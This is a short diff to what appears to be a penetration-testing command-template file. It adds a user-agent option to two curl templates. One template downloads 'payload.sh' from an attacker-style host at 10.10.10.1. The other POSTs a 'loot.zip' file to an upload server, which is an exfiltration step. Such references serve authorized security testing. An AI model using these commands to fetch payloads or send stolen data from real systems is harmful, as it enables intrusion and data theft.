@@ -32,7 +32,7 @@ wget -r -np -nH --cut-dirs={{DEPTH:int:1}} {{URL:url:http://10.10.10.1:8000/tool
 Download a file with curl, following redirects.
 
 ```bash
-curl -Lo {{OUTFILE:file:payload.sh}} {{URL:url:http://10.10.10.1:8000/payload.sh}}
+curl -Lo {{OUTFILE:file:payload.sh}} -A "{{UA:str:$(q-ua)}}" {{URL:url:http://10.10.10.1:8000/payload.sh}}
 ```
 
 <!-- meta: risk=low | phase=misc | tags=curl,download,http -->
@@ -43,7 +43,7 @@ curl -Lo {{OUTFILE:file:payload.sh}} {{URL:url:http://10.10.10.1:8000/payload.sh
 Upload a file to an upload server via POST.
 
 ```bash
-curl -X POST {{URL:url:http://10.10.10.1:8000/upload}} -F "files=@{{FILE:file:loot.zip}}"
+curl -X POST -A "{{UA:str:$(q-ua)}}" {{URL:url:http://10.10.10.1:8000/upload}} -F "files=@{{FILE:file:loot.zip}}"
 ```
 
 <!-- meta: risk=low | phase=misc | tags=curl,upload,post -->
